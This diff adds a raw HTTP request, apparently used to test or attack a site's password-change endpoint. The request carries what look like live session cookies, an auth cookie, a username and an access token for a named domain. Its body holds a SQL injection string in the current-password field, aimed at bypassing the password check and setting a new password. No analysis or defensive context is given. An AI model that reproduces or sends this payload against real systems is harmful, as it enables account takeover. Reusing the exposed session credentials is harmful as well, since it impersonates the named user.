@@ -1,0 +1,10 @@
+POST https://kingattorney.net/User/ChangePassword
+cookie: ASP.NET_SessionId=mougxpn0dxabhhjmyl1kcbmm; __RequestVerificationToken=MBpRRZZtmQ-DD-BZMMNaqH5ozMFnZZyqDLUorgKhbxq9V2RbOjiHqb4BgwrFXVPOXpdc4KUsI7q0mGXXW6Ta0ECmQvotXTrgjuLWNJy5fis1; .ASPXAUTH=040B6589B58573D2C999522C8999ACAE3ACF090922C4B4637EAF1AC0E7EE2FCDA7E33FC16B9322F2999521EDB5F4AFE98337070090FF877EA61A72DEFF1B56230ACA1C8720A6D3E182AC428653A7AEAAB1825E14DBEECBF022789E3FEA3E52F9; id=106; user=anhocva214; avatar=/Assets/admin/images/users/user-1.jpg; access_token=1111
+Content-Type: application/json
+
+{
+    password: ' or ''*',
+    newpassword: 123
+}
+
+# password=1234&newpassword=123
